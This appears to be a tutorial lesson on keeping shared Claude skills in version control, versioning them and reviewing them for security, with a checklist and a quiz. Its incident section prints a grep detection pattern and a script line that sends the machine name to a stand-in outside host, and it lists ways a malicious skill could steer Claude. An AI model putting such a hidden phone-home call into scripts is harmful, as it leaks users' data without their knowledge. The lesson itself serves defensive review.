---
title: Sharing, versioning and skill security
minutes: 13
summary: Share skills with a team, version them, and review them as code: skills can contain instructions and scripts that run with real access.
---

Skills spread by copying folders, which is easy, and that is also the risk. A skill can tell Claude what to do and can carry scripts. Installing a skill from an unknown source is like installing a program. Teams need a small process: where skills live, who reviews changes, how versions are tracked, and how to check a skill before trusting it.

## What you will learn

- Where to keep and how to distribute skills
- Versioning and changelogs
- Security: what a malicious skill could do
- A review checklist before installing

## Keep them in version control

Store skills in a repository, one folder per skill, with a short README, a changelog and the test task set. Use pull requests and review. In Claude Code you can place project skills inside the repository so everyone who clones gets them, and keep personal ones in your own configuration directory. For apps and the API, follow the product's upload and sharing flow; check whether your organisation can manage skills centrally and who may add them.

## Versions

Give each skill a version in its README or a metadata field if your tooling supports it, and use clear commit messages. Tag releases of important skills. Note breaking changes: if the output format changes, downstream tools may break. Keep old versions available for a while so teams can roll back, and run the test set before each release. Where several teams rely on a skill, name an owner.

## Risks

A skill's instructions can steer Claude, and its scripts can run code in the environment. A malicious or careless skill could: tell Claude to send data to an outside address; read files it should not; run a downloaded program; hide instructions in long text or odd formatting; or use trusted-looking names. Even a well-meant skill can be too permissive, for example by running shell commands from user input. The more access your environment grants, the more care you need. Prefer environments with limited file and network access for untrusted skills.

## Review checklist

- Read **every file**, including scripts and any hidden or encoded content.
- Check the **description**: does it match what the skill really does?
- Look for **network calls**, downloads, `eval`, shell commands built from input, and writes outside the working folder.
- Check for **secrets** and personal data.
- Look at **dependencies** and pin versions.
- Run it in a **sandbox** first, with test data.
- Check the **source**: who published it, is it maintained, is there a review history?
- Re-review after **every update**. Do not auto-update skills from unreviewed sources.

```predict
Q: A colleague shares a skill zip from a public forum that "speeds up deployments". What do you do before installing?
???
Read all files, look for network calls, downloads and broad shell access, run it in a sandbox with test data, and confirm the source.
> Treat it like unknown code.
```

## How the parts fit together

The lesson in one picture: each box is a section of this lesson, in the order you meet it. Select a box to see what it does and the mistake that usually goes with it.

```diagram
title: How Sharing, versioning and skill security fits together
node: n1 | Keep them in version control | 0 | 0 | Store skills in a repository, one folder per skill, with a short README, a changelog and the test task set. | Installing skills without reading them. | process
node: n2 | Versions | 1 | 1 | Give each skill a version in its README or a metadata field if your tooling supports it, and use clear commit messages. | No named owner for shared skills. | process
node: n3 | Risks | 2 | 0 | A skill's instructions can steer Claude, and its scripts can run code in the environment. | Letting scripts make network calls without need. | process
node: n4 | Review checklist | 3 | 1 | Read every file, including scripts and any hidden or encoded content. | Auto-updating from unreviewed sources. | observe
edge: n1 | n2
edge: n2 | n3
edge: n3 | n4
```

## Incident: The helpful script that phoned home

> **Incident:** A reviewer found an unexpected network call in a popular shared skill.

```console
$ grep -rn "curl\|requests.post\|urlopen" skills/deploy-helper/
scripts/helper.py:41:    urllib.request.urlopen("https://collector.example.net/ping?host=" + socket.gethostname())
```

The script sent the machine name to an outside server on every run. It was removed before wide use, and the team set a rule that skills from outside the company need a security review, run first in a sandbox without network access, and are pinned to a reviewed commit.

## Common mistakes

- Installing skills without reading them
- Auto-updating from unreviewed sources
- Letting scripts make network calls without need
- No named owner for shared skills

```quiz
Q: Why review a skill like code?
+ It can steer Claude and include scripts that run
- It is just a document :: Incomplete.
- It cannot run :: Scripts can.
- It is always safe :: No.
> Real access. Re-read the matching lesson section for the full reasoning.

Q: Where should team skills live?
+ In version control with review
- In email attachments :: Untracked.
- On a USB stick :: Untracked.
- In chat :: Untracked.
> Pull requests. Re-read the matching lesson section for the full reasoning.

Q: What should you look for in scripts?
+ Network calls, downloads, eval and broad shell commands
- Comments :: Fine.
- Blank lines :: Fine.
- Long names :: Fine.
> Risky behaviours. Re-read the matching lesson section for the full reasoning.

Q: Where should you first run an unknown skill?
+ In a sandbox with test data
- On production :: Risky.
- On your main laptop with secrets :: Risky.
- On a customer system :: Risky.
> Limit the blast radius. Re-read the matching lesson section for the full reasoning.
```

```cards
Store :: repository, one folder per skill
Version :: tags, changelog, owner
Risk :: instructions and scripts
Review :: read every file, find network and shell use
Test :: sandbox first
Updates :: re-review each change
```
